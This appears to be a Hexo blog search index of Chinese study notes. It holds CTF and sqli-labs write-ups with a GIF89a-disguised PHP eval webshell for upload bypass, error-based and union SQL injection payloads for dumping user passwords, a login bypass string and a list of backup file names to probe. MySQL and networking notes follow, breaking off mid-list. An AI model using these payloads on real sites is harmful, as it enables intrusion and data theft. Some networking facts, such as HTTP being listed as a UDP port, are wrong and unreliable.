<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2021/10/02/GIF89a/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。</p>
<p>当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头文件欺骗)，后台认为是图片,上传后再执行木马。</p>
<p>先将文件改为.gif欺骗网址第一层，抓包将filename改为以.phtml结尾并以这种方式进行，GIF89a则负责骗过第二层。</p>
<p><img src="https://i.loli.net/2021/11/10/UlpZ1Dqe9WIMkwf.png" alt="请添加图片描述"></p>
<p>通过蚁剑一般连接的是：url/upload/文件名<br>此题为：<img src="https://i.loli.net/2021/11/10/QNjrMHAE1XzoWkY.png" alt="请添加图片描述"><br>蚁剑连接即可</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/14/%E5%88%A9%E7%94%A8burp%E6%8A%93%E5%8C%85%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="基于burp抓包"><a href="#基于burp抓包" class="headerlink" title="基于burp抓包"></a>基于burp抓包</h1><blockquote>
<p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】</p>
</blockquote>
<h2 id="用户代理头部注入"><a href="#用户代理头部注入" class="headerlink" title="用户代理头部注入"></a>用户代理头部注入</h2><ul>
<li>sqli_lab 18 源代码：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/PXOEW7npUCmgwla.png" alt="代理头部2"></p>
<ul>
<li>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent‘, ‘$IP‘, $uname)”;将useragent和ip插入到数据库中,首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分,账号和密码都是admin。</li>
<li>print_r(mysql_error())则表示使用报错注入。</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/HsryI6ef4Z7UcDb.png"></p>
<ul>
<li>源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分：User-Agent.而IP使用了REMOTE_ADDR，它能被代理服务器或路由器修改，但并非修改XFF头就可修改。</li>
</ul>
<p>现在抓包改参数：</p>
<p><img src="https://i.loli.net/2021/11/10/OmvVXJCbeZl6ETN.png" alt="屏幕截图 2021-10-14 124401"></p>
<ul>
<li>没有报错，同时把User_Agent的值传出来，但如果输入User_Agent值有错或者没有按照要求则会显示报错：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/di9SRyFcWAzhaKm.png" alt="屏幕截图 2021-10-14 124609"></p>
<ul>
<li>使用报错注入：</li>
</ul>
<p><code> 1&#39; and extractvalue(1,concat(0x7e,database())) and &#39;1#</code></p>
<p><img src="https://i.loli.net/2021/11/10/kM8AqwSEoC132lP.png" alt="屏幕截图 2021-10-14 125322"></p>
<ul>
<li>现在显示了库名，接下来爆表名和字段就行了</li>
</ul>
<p><code> 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;))) and &#39;1#</code></p>
<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><ul>
<li>sqli_lab 19 源代码：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/r2sP8tBkQbi47XM.png" alt="屏幕截图 2021-10-15 075859"></p>
<p><img src="https://i.loli.net/2021/11/10/PBvkj87RFrxqGpf.png" alt="屏幕截图 2021-10-06 190904"></p>
<ul>
<li>显示从Referer入手，则输入代码：</li>
</ul>
<p><code>1&#39; and extractvalue(1,concat(0x7e,database())),&#39;1#</code></p>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ul>
<li>sqli_lab 20 源代码：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/nymKLT6rAto3I17.png" alt="屏幕截图 2021-10-15 090712"></p>
<ul>
<li>如果输入uname和passwd则setcookie</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/Pu13r9cIYnN5EbD.png" alt="屏幕截图 2021-10-15 090922"></p>
<ul>
<li><p>如果没有点击submit提交则查询cookie，通过uname传参</p>
</li>
<li><p>传入uname和passwd后抓包，这时再删去uname和passwd，在cookie插入<code>uname= 1&#39;and extractvalue(1,concat(0x7e,database()))#</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/QT9FsgKNrnMRGcI.png" alt="屏幕截图 2021-10-15 091219"></p>
<ul>
<li>sqli_lab 21 源代码：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/tgu8WVqijzcrn7F.png" alt="img"></p>
<ul>
<li>与20类似，不过将输入的uname值解码后传给cookee，1’) and extractvalue(1,concat(0x7e,database()))#将其编码后赋值给cookee则可以爆库名</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/02/mysql%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="数据库操作："><a href="#数据库操作：" class="headerlink" title="数据库操作："></a>数据库操作：</h1><hr>
<h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ul>
<li>cd 进入bin目录 输入 mysql -u root -p 然后输入密码<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li>
<li>show databases; 显示数据库</li>
<li>use 库名; 选择数据库</li>
<li>DROP DATABASE 库名; 删除库</li>
<li>creat database 库名; 创建库</li>
</ul>
<hr>
<h1 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h1><ul>
<li>show tables; 显示表</li>
<li>drop table 表名; 删除表</li>
<li>creat table 表名(<br>列名 类型 是否可以为空，<br>列名 类型 是否可以为空，<br>)ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><img src="https://i.loli.net/2021/11/10/1uqxWD5js8meEhS.png" alt="请添加图片描述"></li>
</ul>
<h1 id="字段操作："><a href="#字段操作：" class="headerlink" title="字段操作："></a>字段操作：</h1><hr>
<ul>
<li><p>alter table 表名<br>  add column `字段名` &lt;数据类型&gt; comment `备注`; 添加字段<br>  <img src="https://img-blog.csdnimg.cn/0d60f2fa512b4938be65506c52bd9a9d.png" alt="请添加图片描述"></p>
</li>
<li><p>alter table 表名<br>change column `老字段名` `新字段名` &lt;数据类型&gt; comment `备注`; 修改字段</p>
</li>
<li><p>alter table 表名</p>
</li>
<li><p>drop column 表名; 删除字段</p>
</li>
</ul>
<h1 id="记录操作："><a href="#记录操作：" class="headerlink" title="记录操作："></a>记录操作：</h1><hr>
<h2 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h2><h3 id="一次插入一条"><a href="#一次插入一条" class="headerlink" title="一次插入一条"></a>一次插入一条</h3><ul>
<li>insert into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h3 id="一次插入多条"><a href="#一次插入多条" class="headerlink" title="一次插入多条"></a>一次插入多条</h3></li>
<li>insert into `表名`  ( `字段名1`, `字段名2`) values ( value1.1,value1.2 ),(value2.1,value2.2 ) <h3 id="根据索引值进行判断，若存在，先删除在插入"><a href="#根据索引值进行判断，若存在，先删除在插入" class="headerlink" title="根据索引值进行判断，若存在，先删除在插入"></a>根据索引值进行判断，若存在，先删除在插入</h3></li>
<li>replace into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h2 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h2><h3 id="删除一条或多条"><a href="#删除一条或多条" class="headerlink" title="删除一条或多条"></a>删除一条或多条</h3></li>
<li>delete from 表名 where id = （=也可以换成&gt;,&lt;）<br>(id号还是会继续累加)<h3 id="初始化表"><a href="#初始化表" class="headerlink" title="初始化表"></a>初始化表</h3></li>
<li>truncate 表名<br>(id号从1开始)<h2 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h2></li>
<li>update 表名 set  字段名1 = ‘value1’ ,字段名2 = ‘value2’ where id =<h2 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h2><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><h4 id="查询表中某些字段"><a href="#查询表中某些字段" class="headerlink" title="查询表中某些字段"></a>查询表中某些字段</h4></li>
<li>select 字段1,字段2 from 表 <h4 id="以表中某些字段为条件查询"><a href="#以表中某些字段为条件查询" class="headerlink" title="以表中某些字段为条件查询"></a>以表中某些字段为条件查询</h4></li>
<li>select * from 表 where 字段1=’value1’ and 字段2=’value2’<br>若查看除某些字段以外的其他：</li>
<li>select * from 表 where 字段 not in (‘value1’,’value2’)</li>
<li>select * from 表 where 字段 &lt;&gt; ‘value’<h4 id="按照id号查询"><a href="#按照id号查询" class="headerlink" title="按照id号查询"></a>按照id号查询</h4></li>
</ul>
<p>1.select * from 表 where id =1or id=2 or id=3<br>2.select * from 表 where id in(1,2,3)<br>3.select * from 表 where id in(‘1’,’2’,’3’)<br>若查看除某些id号以外的其他：</p>
<ul>
<li>select * from 表 where id not in(‘1’,’2’,’3’)</li>
</ul>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul>
<li><p>select * from 表  order by 字段 desc(降) asc(胜) limit 0,3<br>(limit 0,3 从第一个开始选 选三个)</p>
<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><blockquote>
<p>场景：有两个表 员工信息employee_info ，员工工资employ_pay<br>我们需要根据一个人的姓名对应的id，查询对应的工资以及显示对应的姓名</p>
</blockquote>
</li>
<li><p>select pay,(select name from employ_info where id=3) as username from employ_pay where nameid=3</p>
<h4 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h4></li>
<li><p>select b.name,a.pay from employ_pay a,employee_info b where a.nameid=b.id and b.id=3</p>
<h4 id="左-右链接查询"><a href="#左-右链接查询" class="headerlink" title="左/右链接查询"></a>左/右链接查询</h4></li>
<li><p>左链接查询<br>(显示左边表所有记录，以及右边表满足条件的记录)<br>select a.*,b.pay from employee_info a left join employee_pay b on a.id=b.nameid</p>
</li>
<li><p>右链接查询<br>(显示右边表所有记录，以及左边表满足条件的记录)<br>select a.*,b.pay from employee_pay a left join employee_info b on a.id=b.nameid</p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3></li>
<li><p>查询语句1<br>union<br>查询语句2</p>
</li>
<li><p>条件：<br> 1、要求多条查询 语句的查询列数是一致的<br> 2、要求多条查询语句的查询的每一列的类型和最好一致<br> 3、union关键字默认去重，如果使用union all 可以包含重复项</p>
</li>
</ul>
<h1 id="sqli-lab-记录"><a href="#sqli-lab-记录" class="headerlink" title="sqli-lab 记录"></a>sqli-lab 记录</h1><p>每个库里都有information_schema表</p>
<p>而每个information_schema表里都有information_schema.tables字段</p>
<p>table_schema  库名</p>
<p>schema_name 表名</p>
<h3 id="简单的了解万能密码"><a href="#简单的了解万能密码" class="headerlink" title="简单的了解万能密码"></a>简单的了解万能密码</h3><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h3 id="‘or’1‘-’1"><a href="#‘or’1‘-’1" class="headerlink" title="‘or’1‘=’1"></a>‘or’1‘=’1</h3><ul>
<li>原理：SQL语句sql=”select * from user where username=’”&amp;username&amp;”‘and password=’”&amp; password&amp;’”,当我们的密码填写’or’1’=’1提交的时候，此时语句中的password等于’or’1’=’1，那么，这条SQL语句就变成了：sql=”select * from user where username=’”&amp;username&amp;”‘and password= ‘’or’1’=’1’,然而，1=1是恒等条件，自然也就通过了程序的验证。</li>
<li>方法：首先我们需要在密码的最前面有一个单引号，来闭合SQL语句中的单引号，然后构造一个or，也就是或者，后面加一个恒等条件即可最简单的就是1=1，同样为了使SQL语句不出错，是来闭合程序中的SQL语句的后面的单引号的，如果我们在后面再加上一个单引号的话就会出错。</li>
</ul>
<h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><ul>
<li><p>1.输入’1等字符看报错判断闭合方式</p>
</li>
<li><p>2.利用order by 判断列数</p>
</li>
<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
</li>
<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
</li>
<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
</li>
</ul>
<p>from information_schema.schemata –+</p>
<ul>
<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
</ul>
<p>from information_schema.tables where table_schema=’security’ –+</p>
<ul>
<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
</ul>
<p>from information_schema.columns where table_name=’users’ –+</p>
<ul>
<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
</ul>
<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/23/%E5%B9%BF%E5%85%A8%E9%A2%98%E5%BA%93/</url>
    <content><![CDATA[<h2 id="1-简单eval-函数运用"><a href="#1-简单eval-函数运用" class="headerlink" title="1.简单eval()函数运用"></a>1.简单eval()函数运用</h2><p><img src="https://i.loli.net/2021/11/10/kAtwmZpXVPlWYK6.png" alt="屏幕截图 2021-10-23 122515"></p>
<ul>
<li>eval()函数：</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/vihCRUmpJFKeMqn.png" alt="屏幕截图 2021-10-23 121905"></p>
<ul>
<li>所以b=<?php system("tac flag.php"); ?>是错的,应该b=system(“tac flag.php”); ?&gt;。前标签不应该加,后标签用于封闭题目给出的 ‘&lt;? php’</li>
</ul>
<h2 id="2-sql注入"><a href="#2-sql注入" class="headerlink" title="2.sql注入"></a>2.sql注入</h2><blockquote>
<p>常见的网站源码备份文件后缀<br>tar<br>tar.gz<br>zip<br>rar<br>常见的网站源码备份文件名<br>web<br>website<br>backup<br>back<br>www<br>wwwroot<br>temp</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/11/01/%E8%AE%A1%E7%BD%91%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="零、计算机网络"><a href="#零、计算机网络" class="headerlink" title="零、计算机网络"></a>零、计算机网络</h2><h3 id="（1）因特网的组成"><a href="#（1）因特网的组成" class="headerlink" title="（1）因特网的组成"></a>（1）因特网的组成</h3><ul>
<li>因特网=边缘部分+核心部分=资源子网+通信子网</li>
</ul>
<h4 id="因特网的边缘部分："><a href="#因特网的边缘部分：" class="headerlink" title="因特网的边缘部分："></a>因特网的边缘部分：</h4><p>主机间的通信方式：客户服务器方式、对等方式</p>
<h4 id="因特网的核心部分："><a href="#因特网的核心部分：" class="headerlink" title="因特网的核心部分："></a>因特网的核心部分：</h4><p>数据交换方式：</p>
<p>1.电路交换(适合数据量大的实时传输)</p>
<p>2.报文交换</p>
<p>3.分组交换</p>
<img src="https://i.loli.net/2021/11/10/qvhNtXdB1zORkF3.png" alt="交换方式" style="zoom:50%;" />

<h3 id="（2）计算机网络的性能"><a href="#（2）计算机网络的性能" class="headerlink" title="（2）计算机网络的性能"></a>（2）计算机网络的性能</h3><h4 id="1-速率"><a href="#1-速率" class="headerlink" title="1.速率"></a>1.速率</h4><p>链接在计算机网络上的主机在数字信道上传输数据位数的速率，也称data rate或bit rate。单位b/s，kb/s，Mb/s，Gb/s。</p>
<h4 id="2-带宽"><a href="#2-带宽" class="headerlink" title="2.带宽"></a>2.带宽</h4><p>数据通信领域中，数字信道所能传输的最高数据率。单位b/s，kb/s，Mb/s，Gb/s。</p>
<h4 id="3-吞吐量"><a href="#3-吞吐量" class="headerlink" title="3.吞吐量"></a>3.吞吐量</h4><p>单位时间内通过某个网络的数据量，即所有数字信道上的数据量之和。单位b/s，Mb/s。</p>
<h4 id="4-时延"><a href="#4-时延" class="headerlink" title="4.时延"></a>4.时延</h4><ul>
<li>发送时延</li>
<li>传播时延</li>
<li>排队时延</li>
<li>处理时延</li>
</ul>
<h4 id="5-时延带宽积"><a href="#5-时延带宽积" class="headerlink" title="5.时延带宽积"></a>5.时延带宽积</h4><p>传播时延*带宽</p>
<h4 id="6-往返时间"><a href="#6-往返时间" class="headerlink" title="6.往返时间"></a>6.往返时间</h4><p>从发送方发送数据开始到发送方收到接收方确认(ping)。</p>
<h4 id="7-利用率"><a href="#7-利用率" class="headerlink" title="7.利用率"></a>7.利用率</h4><ul>
<li>信道利用率、网络利用率</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/ouP2FebQdjRKfsr.png" alt="利用率"></p>
<h3 id="（3）计算机网络的体系结构"><a href="#（3）计算机网络的体系结构" class="headerlink" title="（3）计算机网络的体系结构"></a>（3）计算机网络的体系结构</h3><h4 id="1-几个基本概念"><a href="#1-几个基本概念" class="headerlink" title="1.几个基本概念"></a>1.几个基本概念</h4><ul>
<li><p>ISO——国际标准化组织</p>
</li>
<li><p>OSI/RM——七层模型，是由ISO(国际标准化组织）制定的，它是一个七层的、抽象的模型体，不仅包括一系列抽象的术语或概念，也包括具体的协议</p>
</li>
<li><p>TCP/IP Suite(TCP/IP传输协议)——因特网事实上的国际标准</p>
</li>
<li><p>Network Protocols——数据交换遵守的规则、标准或约定</p>
</li>
<li><p>网络体系结构——计算机网络各层及其协议的集合</p>
</li>
</ul>
<h4 id="2-OSI参考模型"><a href="#2-OSI参考模型" class="headerlink" title="2.OSI参考模型"></a>2.OSI参考模型</h4><p><strong>应用层</strong>：能产生网络流量能够和用户交互的应用程序。协议有：HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POP3 DHCP</p>
<p><strong>表示层</strong>：数据的表示、加密、安全、压缩。格式有，JPEG、ASCll、DECOIC、加密格式等</p>
<p><strong>会话层</strong>：服务和客户端建立、管理、终止会话。对应主机进程，指本地主机与远程主机正在进行的会话(可以查木马)</p>
<p>cmd  :netstat -nb</p>
<p><strong>传输层</strong>：可靠传输(建立会话，保持联系)，不可靠传输(不建立会话)，流量控制。定义传输数据的协议端口号，以及流控和差错校验。协议有：TCP UDP，数据包一旦离开网卡即进入网络传输层</p>
<p><strong>网络层</strong>：IP地址编址，实现不同网络之间的最佳路径选择。协议有：ICMP IGMP IP（IPV4 IPV6） ARP RARP</p>
<p><strong>数据链路层</strong>：建立逻辑连接、进行硬件地址寻址、差错校验等功能。将比特组合成字节进而组合成帧，用MAC地址访问介质，错误发现但不能纠正。</p>
<p><strong>物理层</strong>：建立、维护、断开物理连接。电压，接口标准</p>
<p><img src="https://i.loli.net/2021/11/10/DMVQITGijPXmCkl.png" alt="屏幕截图 2021-11-02 092633"></p>
<p><img src="https://i.loli.net/2021/11/10/FOKMHTleLfPQRX5.png" alt="屏幕截图 2021-11-02 093133"></p>
<h4 id="3-TCP-IP协议"><a href="#3-TCP-IP协议" class="headerlink" title="3.TCP/IP协议"></a>3.TCP/IP协议</h4><p>是Internet最基本的协议，是由网络层的IP协议和传输层的TCP协议组成的。主要用于规范网络上所使用的通信设备，也是一个主机与另一个主机之间的传输方式。</p>
<p>实际应用中，TCP/IP协议是一组协议的代名词，它还包括许多别的协议，组成了TCP/IP协议簇。比如SLIP PPP IP ICMP ARP TCP UDP FTP DNS 等</p>
<h2 id="一、应用层"><a href="#一、应用层" class="headerlink" title="一、应用层"></a>一、应用层</h2><h3 id="（1）互联网中常见的应用协议"><a href="#（1）互联网中常见的应用协议" class="headerlink" title="（1）互联网中常见的应用协议"></a>（1）互联网中常见的应用协议</h3><blockquote>
<p>1.HTTP(超文本传输协议)——用于访问web服务</p>
<p>2.HTTPS(安全的超文本传输协议)——能将http通信进行加密访问</p>
<p>3.SMTP(简单邮件传输协议)——用于发送电子邮件</p>
<p>4.POP3(邮局协议版本3)——用于接收电子邮件</p>
<p>5.DNS(域名解析)——解析域名</p>
<p>6.FTP(文件传输协议)——在Internet上传和下载文件</p>
<p>7.Telent协议(远程登录)——用于远程配置网络设备和Linux系统</p>
<p>8.DHCP(远程主机配置协议)——用于计算机自动请求IP地址</p>
</blockquote>
<h3 id="（2）域名的结构"><a href="#（2）域名的结构" class="headerlink" title="（2）域名的结构"></a>（2）域名的结构</h3><ul>
<li>一个域名下可以有多个主机，域名全球唯一，主机名+域名肯定也是全球唯一的。主机名+域名称为完全限定域名(FQDN)。例如，一台机器的主机名(hostname)是www，域名后缀(domain)是51cto.com，则他的FQDN就是<a href="http://www.51cto.com..使用时最后的“.”经常省去.主机名更多的代表一个服务或者应用而不是一个服务器,一个服务器上可以有多个主机名./">www.51cto.com.。使用时最后的“.”经常省去。主机名更多的代表一个服务或者应用而不是一个服务器，一个服务器上可以有多个主机名。</a></li>
</ul>
<h4 id="域名的分层"><a href="#域名的分层" class="headerlink" title="域名的分层"></a>域名的分层</h4><ul>
<li>所有的域名都是以英文的“.”开始的，是域名的根，根下面是顶级域名-&gt;二级域名-&gt;三级域名-&gt;四级域名</li>
<li>“国家代码顶级域名”指示国家区域，”通用顶级域名“指示注册者的域名使用领域，不带国家特性。在国家顶级域名下注册的二级域名均由该国家自行确定，我国把二级域名划分为“类别域名”和“行政区域名”。</li>
<li>我国修订的域名体系允许在cn顶级域名下直接注册二级域名，例如abe.com.cn可以注册为abe.cn</li>
</ul>
<h4 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a>顶级域名</h4><p>国家顶级域名：.cn代表中国，.us代表美国，.fr代表法国，.uk代表英国，.jp代表日本</p>
<p>通用顶级域名：com代表公司或企业，net代表网络服务机构，org代表非营利性组织，int代表国际组织，edu代表教育机构，gov代表政府部门，mil代表军事部门</p>
<h4 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h4><p>类别域名：ac(科研机构) com(工、商、金融等企业) edu(我国教育机构) gov(我国政府机构) mil(我国国防机构) net(提供互联网服务的机构) org(非盈利性机构)</p>
<p>行政区域名：bj(北京市) js(江苏省)</p>
<p><img src="https://i.loli.net/2021/11/10/Rx2tyBVFaGnNPUW.jpg" alt="7E0E107AA50E78038F0751240CC8FF68"></p>
<h3 id="cmd-nslookup"><a href="#cmd-nslookup" class="headerlink" title="cmd-nslookup"></a>cmd-nslookup</h3><p>可以查询DNS记录，查询域名解析是否正常，可以看到解析域名的DNS服务器和该域名服务器的地址</p>
<h3 id="为什么有WWW"><a href="#为什么有WWW" class="headerlink" title="为什么有WWW"></a>为什么有WWW</h3><p><strong>万维网和互联网</strong></p>
<p>　　我们通常所说的互联网，英文名字叫做Internet。互联网是21世纪之初网络与网络之间所串连成的庞大网络。</p>
<p>​        它是由从地方到全球范围内几百万个私人的、学术界的、企业的和政府的网络所构成，通过电子，无线和光纤网络技术等等一系列广泛的技术联系在一起。</p>
<p>　　这种将计算机网络互相联接在一起的方法可称作“网络互联”，在这基础上发展出覆盖全世界的全球性互联网络称互联网，即是互相连接一起的网络。</p>
<p>　　互联网并不等同万维网(WWW)，万维网只是一个基于超文本相互链接而成的全球性系统，且是互联网所能提供的服务其中之一。互联网带有范围广泛的信息资源和服务，除此以外还有文件传输(FTP)、电子邮件(E-mail)、远程登录(Telnet)等。</p>
<p>　　为了区分互联网中的各种应用，就有了不同的子域名，比如万维网就以WWW作为子域名，文件传输以FTP作为子域名，电子邮件以Mail作为子域名。</p>
<p>　　所以，我们经常看到的网址可能有<code> www.ymw.cn</code>,<code>dl.ymw.cn</code> 等等的子域名形式。</p>
<p>​       但在我们互联网发展早期，网站的域名都是以<code>www.xxx.com</code>的形式进行宣传，大家也就有了一种惯性，一看到 www 开头的就知道是一个网址。拿我的博客域名<code>taoshu.in</code>为例，没有 www，很多人可能就不知道这是一个域名。</p>
<p>​       腾讯的邮箱服务域名是<code>mail.qq.com</code>，腾讯视频的域名是<code>v.qq.com</code>。腾讯门户网站是<code>www.qq.com</code>。 这里的 www 表示万维网的意思，一般指对外提供 html/web 服务。如果腾讯还想提供 ftp 服务，那大概率会使用<code>ftp.qq.com</code>这个域名。</p>
<h3 id="（3）端口"><a href="#（3）端口" class="headerlink" title="（3）端口"></a>（3）端口</h3><h4 id="1-按端口号分布划分"><a href="#1-按端口号分布划分" class="headerlink" title="1.按端口号分布划分"></a>1.按端口号分布划分</h4><ul>
<li><p>公认端口：公认端口包括端口号从0-1023，它们紧密的绑定一些服务。通常这些端口的通信明确表明了某种服务的协议，比如80端口分配给HTTP服务，21端口分配给FTP服务等。</p>
</li>
<li><p>注册端口：注册端口包括端口号从1024-49151，它们松散地绑定一些服务。</p>
</li>
<li><p>动态和/或私有端口：动态和/或私有端口包括端口号从49152-65535，理论上不应该为服务分配这些端口。但是一些木马和病毒喜欢这些端口，因为这些端口不容易引起注意。</p>
</li>
</ul>
<h4 id="2-按协议类型划分"><a href="#2-按协议类型划分" class="headerlink" title="2.按协议类型划分"></a>2.按协议类型划分</h4><ul>
<li><p>TCP端口：</p>
<p>Telent协议端口，SMTP协议端口，FTP协议端口，POP3协议端口</p>
</li>
<li><p>UDP端口：</p>
<p>HTTP协议端口，DNS协议端口，SNMP协议端口，QQ协议端口</p>
</li>
</ul>
<h2 id="二、传输层"><a href="#二、传输层" class="headerlink" title="二、传输层"></a>二、传输层</h2><ul>
<li>互联网是不可靠的，网络拥塞时，来不及处理的数据包就会被路由器丢掉，应用程序通信发送的报文想要完整的传输给对方，就需要在通信计算机之间有可靠传输机制，也就是可靠传输协议，即传输控制协议(TCP)；有些应用不需要可靠传输，就使用用户数据报协议(UDP)。</li>
<li>若程序要传输的报文大，就需要分段传输，每段封装成一个数据包，在接收端将分段组装成完整报文(TCP)；若传输报文小，则不需要分段(UDP)。</li>
</ul>
<h3 id="（1）TCP和UDP协议"><a href="#（1）TCP和UDP协议" class="headerlink" title="（1）TCP和UDP协议"></a>（1）TCP和UDP协议</h3><h4 id="1-TCP介绍"><a href="#1-TCP介绍" class="headerlink" title="1.TCP介绍"></a>1.TCP介绍</h4><ul>
<li>TCP协议为应用层协议提供可靠传输，在应用程序通信之前要建立TCP连接，客户端程序和服务端程序使用建立的TCP连接实现双向通信，应用程序通信结束后，释放TCP连接。</li>
</ul>
<h4 id="2-TCP功能"><a href="#2-TCP功能" class="headerlink" title="2.TCP功能"></a>2.TCP功能</h4><blockquote>
<p>在计算机访问某网站时，计算机并不是直接发送HTTP请求给该网站，而是先调用传输层的TCP向该网站发送建立TCP连接的请求；建立TCP连接后，HTTP使用该连接进行双向交互通信，HTTP通信结束后释放TCP连接。</p>
</blockquote>
<ul>
<li>功能1.建立连接</li>
<li>功能2.可靠传输 -&gt; 数据包丢失超时后发送端会自动重传；数据包没有按顺序到达，会在接收端缓存排序</li>
<li>功能3.拥塞避免 -&gt; 发送端开始发送数据时先感知网络是否拥堵，调整发送速度</li>
<li>功能4.流量控制 -&gt; 如果发送过快，造成接收端应用程序来不及接收缓存读取数据，造成接收缓存慢，则接收端收数据时会告诉发送端应该发送的速度</li>
<li>功能5.释放连接</li>
</ul>
<h4 id="3-TCP可靠传输的实现——停止等待协议"><a href="#3-TCP可靠传输的实现——停止等待协议" class="headerlink" title="3.TCP可靠传输的实现——停止等待协议"></a>3.TCP可靠传输的实现——停止等待协议</h4><blockquote>
<p>(1)无差错情况：</p>
<p>A计算机发送分组M1，发完就暂停发送，等待B的确认。B收到M1就向A发送确认，A收到确认后再发送M2。</p>
<p>(2)出现差错或丢失：</p>
<p>A计算机发送的M1在传输过程中被路由器丢弃，或B接收时检测出了错误并丢弃M1。这两种情况下B什么信息都不会发送，只要A在超过了一段时间仍没有收到确认，就认为刚才发送的分组丢失，则重传一次，这就是超时重传。</p>
<p>(3)确认丢失和确认迟到：</p>
<ul>
<li>确认丢失：</li>
</ul>
<p>B收到M1但是B给A 发送的确认丢失了，A不知道B是否收到M1，则再传一次，则B丢弃重复的M1并重传确认。</p>
<ul>
<li>确认迟到：</li>
</ul>
<p>B收到M1但是B给A 发送的确认1迟到了，A不知道B是否收到M1，则再传一次，则B丢弃重复的M1并重传确认2，A收到发送M2，过了一会又收到了B的确认1，则A直接丢弃。</p>
</blockquote>
<h4 id="4-TCP应用场景"><a href="#4-TCP应用场景" class="headerlink" title="4.TCP应用场景"></a>4.TCP应用场景</h4><p>1.QQ传文件</p>
<p>2.访问网站</p>
<p>3.发送邮件</p>
<p>4.王文FTP服务器下载文件</p>
<h4 id="5-UDP的特点"><a href="#5-UDP的特点" class="headerlink" title="5.UDP的特点"></a>5.UDP的特点</h4><ul>
<li>特点1.UDP是无连接的 即发送开始和结束不需要建立和释放连接，减少开销和发送数据之前的时延</li>
<li>特点2.尽最大努力交付 通信两端不需要保持连接，节省系统资源</li>
<li>特点3.UDP面向报文 UDP对应用层交下来的报文添加首部后原样发送</li>
<li>特点4.UDP没有拥塞控制 因此不会降低源主机的发送速率</li>
<li>特点5.支持一对一，一对多，多对一和多对多的交互通信</li>
<li>特点6.UDP的首部开销小，只有8字节，TCP有20字节</li>
</ul>
<h4 id="6-UDP应用场景"><a href="#6-UDP应用场景" class="headerlink" title="6.UDP应用场景"></a>6.UDP应用场景</h4><p>1.域名解析</p>
<p>2.QQ聊天</p>
<p>3.实时通信（QQ语音）</p>
<p>4.机房教师端发送屏幕广播</p>
<h2 id="三、网络层"><a href="#三、网络层" class="headerlink" title="三、网络层"></a>三、网络层</h2><ul>
